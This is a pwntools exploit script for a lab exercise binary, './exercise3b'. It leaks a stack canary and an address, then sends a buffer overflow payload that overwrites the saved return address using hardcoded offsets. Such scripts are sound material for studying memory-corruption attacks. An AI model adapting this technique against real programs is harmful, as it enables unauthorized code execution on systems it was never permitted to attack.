#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import binascii

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def process_msg(msg, msg_offset, buffer_offset, suffix_offset):
	msg = msg[msg_offset + buffer_offset:-suffix_offset]
	canary = msg[:4]
	ref_addr = msg[4:]
	
	return canary, ref_addr

# Might need to find a way to remove the 31 here
def compute_return_addr(ref_addr):
	ref_addr = ref_addr[::-1]
	ref_addr = binascii.hexlify(ref_addr)
	addr_i = int(ref_addr, 16) - 31
	addr_b = addr_i.to_bytes(8, byteorder='little')
	
	return addr_b

# Might need a way to remove the hardcoded offsets
MSG_OFFSET = 15
BUFFER_OFFSET = 208
SUFFIX_OFFSET = 72

init_msg = b'A' * (BUFFER_OFFSET - 1) + b'\n'

# Send initial message
r = start()
out = r.recv()	
r.send(init_msg)
out = r.recv()

# Process leaked canary and address information
canary, ref_addr = process_msg(out, MSG_OFFSET, BUFFER_OFFSET, SUFFIX_OFFSET)
pad = b'\x00' * (8 - len(ref_addr))
ret_addr = compute_return_addr(ref_addr)
print(ref_addr + pad)
print(ret_addr)
fin_msg = b'a' * BUFFER_OFFSET + canary + ref_addr + pad + b'\x00' * 28 + ret_addr

# Perform buffer overflow attack
r.send(fin_msg)
r.send(b'\n')
out = r.recv()

print(out)
